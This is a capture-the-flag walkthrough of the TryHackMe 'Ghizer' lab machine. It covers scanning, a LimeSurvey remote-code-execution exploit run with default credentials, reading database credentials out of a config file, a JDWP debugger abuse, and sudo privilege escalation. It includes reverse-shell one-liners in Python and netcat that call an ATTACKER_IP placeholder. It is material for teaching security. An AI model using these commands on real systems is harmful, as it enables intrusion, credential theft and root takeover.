# [Ghizer](https://tryhackme.com/room/ghizerctf)

## lucrecia has installed multiple web applications on the server.

# Flag

### What are the credentials you found in the configuration file?

_port 80_

1. Perform an Nmap scan to identify open ports and services:

```bash
nmap <TARGET_IP>
```

**Results:**

```
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
443/tcp open  https
```

2. Use Gobuster to discover hidden directories on port 80:

```bash
gobuster dir -u http://<TARGET_IP>:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/docs                 (Status: 301) [Size: 313]
/themes               (Status: 301) [Size: 315]
/admin                (Status: 301) [Size: 314]
/assets               (Status: 301) [Size: 315]
/upload               (Status: 301) [Size: 315]
/tests                (Status: 301) [Size: 314]
/plugins              (Status: 301) [Size: 316]
/application          (Status: 301) [Size: 320]
/tmp                  (Status: 301) [Size: 312]
/framework            (Status: 301) [Size: 318]
/locale               (Status: 301) [Size: 315]
/installer            (Status: 301) [Size: 318]
/third_party          (Status: 301) [Size: 320]
/server-status        (Status: 403) [Size: 278]
```

2. Navigate to `http://<TARGET_IP>/admin` which redirects to `http://<TARGET_IP>/index.php/admin/authentication/sa/login`. This reveals a LimeSurvey installation.

   - Default credentials: `admin:password`

3. Download the exploit from [ExploitDB](https://www.exploit-db.com/exploits/46634):

```bash
python 46634.py http://<TARGET_IP> admin password
```

Once you have a command shell, execute:

```bash
whoami
pwd
cat application/config/config.php
```

<img width="723" height="435" alt="SCREEN01" src="https://github.com/user-attachments/assets/3525ad61-664e-49a5-acb4-4480cd528510" />

The configuration file reveals database credentials: `Anny:P4$W0RD!!#S3CUr3!`

---

### What is the login path for the wordpress installation?

1. Navigate to `https://<TARGET_IP>/`.

2. Scroll to the bottom of the page. There's a "Log in" link that redirects to the WordPress login page at: `https://<TARGET_IP>/?devtools`

<img width="1171" height="629" alt="SCREEN02" src="https://github.com/user-attachments/assets/df364fa5-7d72-400c-8da8-3cbb1b58f130" />

---

### Compromise the machine and locate user.txt

1. On your attacking machine, set up a netcat listener:

```bash
nc -lvnp 4444
```

2. Using the LimeSurvey RCE shell obtained earlier, execute a Python reverse shell:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

2. Check for internal services:

```bash
netstat -ntpl
```

**Results:**

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:18001         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::38683                :::*                    LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::37809                :::*                    LISTEN      -
tcp6       0      0 :::18002                :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
```

Port 18001 is interesting - it's a Java Debug Wire Protocol (JDWP) port running locally.

3. Set up another listener for the second reverse shell:

```bash
nc -lvnp 5555
```

4. Connect to the Java debugging port using `jdb`:

```bash
jdb -attach localhost:18001
```

**Output:**

```
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
```

5. Set a breakpoint in a commonly executed method:

```bash
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
```

6. Wait for the breakpoint to trigger:

```
Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0
```

7. Execute a command to spawn a reverse shell as the user running the Java process:

```bash
Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc <ATTACKER_IP> 5555 -e /bin/sh")
 new java.lang.Runtime().exec("nc <ATTACKER_IP> 5555 -e /bin/sh") = "Process[pid=27056, exitValue="not exited"]"
```

5. On your second reverse shell (port 5555), you should now be connected as user `veronica`:

```bash
whoami
ls
cat user.txt
```

<img width="585" height="380" alt="SCREEN03" src="https://github.com/user-attachments/assets/04edd18d-5181-4ed1-a0a7-fa23699e05aa" />

---

### Escalate privileges and obtain root.txt

1. Check what commands veronica can run with sudo:

```bash
sudo -l
```

**Results:**

```
Matching Defaults entries for veronica on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
```

Veronica can run `/usr/bin/python3.5 /home/veronica/base.py` as root without a password

2. Since we have write permissions on `base.py`, we can replace it with code that spawns a root shell:

```bash
rm base.py
```

3. Create a new malicious `base.py`:

```bash
echo 'import pty; pty.spawn("/bin/sh")' > base.py
```

4. Run the script with sudo:

```bash
sudo /usr/bin/python3.5 /home/veronica/base.py
whoami
ls /root
cat /root/root.txt
```

<img width="631" height="630" alt="SCREEN04" src="https://github.com/user-attachments/assets/4899ccae-34cd-4f38-a09f-a65100307811" />
